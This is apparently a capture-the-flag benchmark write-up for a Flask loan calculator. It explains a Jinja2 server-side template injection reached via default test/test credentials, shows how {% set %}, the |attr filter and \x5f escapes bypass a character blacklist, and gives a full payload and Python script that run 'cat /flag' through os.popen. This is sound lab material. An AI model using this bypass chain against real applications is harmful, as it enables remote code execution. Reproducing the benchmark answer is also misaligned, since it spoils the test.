# XBEN-063-24 - Loan Calculator - Encoding

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability:** Server-Side Template Injection (Jinja2) with a character blacklist,
plus default credentials to reach the vulnerable endpoint.

`app/website/app/__init__.py` seeds a default account `test`/`test`. Once logged in,
`GET /total_loan_payments` (`app/website/app/routes.py`) builds a JSON body by splicing
the raw `principal` query parameter into an f-string that is then compiled and rendered as
a Jinja2 template:

```python
if "{{" in principal or "}}" in principal or "[" in principal or \
    "]" in principal or "_" in principal or "." in principal:
    return Response('GET parameter `principal` contains forbidden characters.', status=400)

json_template = f"""
{{ "loan_principal": "{principal}" ,"monthly_payment": "{{{{ payment }}}}", "loan_term_amount": "{{{{ term }}}}", "total_loan_payments": "{{{{ payment*term }}}}" }}
"""
rendered = render_template_string(json_template, payment=payment, term=term, ...)
```

The blacklist blocks `{{`, `}}`, `[`, `]`, `_`, `.` — killing the obvious `{{ 7*7 }}` /
`{{ x.__class__ }}` / `x['__class__']` style payloads. Bypasses used:

1. **`{{`/`}}` bypass:** Jinja2 *statement* tags use `{%` / `%}`, which aren't blocked.
   `{% set payment = (...) %}` runs arbitrary code silently (no `{{`/`}}` needed) and
   **overwrites the `payment` variable** that the template's own fixed, un-injectable part
   later prints via real `{{ payment }}` (those double braces come from the surrounding
   f-string, not from our `principal` value, so the blacklist never sees them).
2. **`.`/`[`/`]` bypass (no dot/bracket attribute or item access):** Jinja2's `|attr('name')`
   filter does `getattr`/`getitem`-style access via a pipe instead of a dot, and calling the
   result with `(...)` needs no brackets.
3. **`_` bypass:** dunder names are written with the hex escape `\x5f` in place of each literal
   underscore inside the (single-quoted) filter-argument strings — Jinja2's string-literal
   lexer decodes `\x5f` to the real `_` character at parse time, but the raw HTTP payload we
   send never contains a literal `_`.

Putting it together, the injected `principal` value is:

```
0{% set payment = (cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat /flag')|attr('read')()) %}{% set term = 1 %}
```

`cycler` is a default Jinja2 global (`jinja2.utils.Cycler`); walking
`cycler.__init__.__globals__` reaches the `os` module (imported inside `jinja2.utils`),
from which `os.popen('cat /flag').read()` gives the flag. The leading `0` keeps
`"loan_principal"` a valid string matching the app's own `^[0-9\.]*$` sanity check (the
`{% set %}` tag itself prints nothing), and the flag then appears in the
`"monthly_payment"`/`"total_loan_payments"` fields via the template's *own*, unfiltered
`{{ payment }}` / `{{ payment*term }}` expressions.

## Exploit

```python
import requests

PORT = <PORT>   # e.g. 63696
BASE = f"http://localhost:{PORT}"

s = requests.Session()
s.post(BASE + "/login", data={"username": "test", "password": "test"})  # default creds

gadget = (
    "cycler|attr('\\x5f\\x5finit\\x5f\\x5f')"
    "|attr('\\x5f\\x5fglobals\\x5f\\x5f')"
    "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')"
    "|attr('popen')('cat /flag')"
    "|attr('read')()"
)
principal = "0{% set payment = (" + gadget + ") %}{% set term = 1 %}"

r = s.get(BASE + "/total_loan_payments", params={"principal": principal, "payment": "1", "term": "1"})
print(r.text)
```
